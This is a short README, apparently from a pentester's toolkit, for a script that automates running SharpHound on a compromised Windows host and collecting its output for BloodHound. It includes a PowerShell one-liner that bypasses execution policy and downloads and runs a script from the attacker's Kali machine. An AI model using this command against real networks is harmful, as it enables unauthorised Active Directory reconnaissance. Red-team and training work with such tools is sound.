# Sharphound
When on a windows machine and have admin, the idea of downloading and running sharphound is tiresome. Renaming the zip file so that its not too confusing is time wasiting. This script here automates that.

1. Have SharpHound.exe in your /var/www/html/ directory
2. On target, Run the one liner which will then: 
  a. Downloads the auto_sharphound.ps1 onto disk
  b. Download SharpHound.exe onto disk
  c. Executes .\SharpHound.exe
  d. Renames the .zip file to $hostname_$ipaddress.zip

3. Now all you have to do is download it to your kali machine and injest it into Bloodhound.

```
powershell -ep bypass -c "IWR http://<KALI_IP>/auto_sharphound.ps1 -OutFile auto_sharphound.ps1; .\auto_sharphound <KALI_IP>"
```

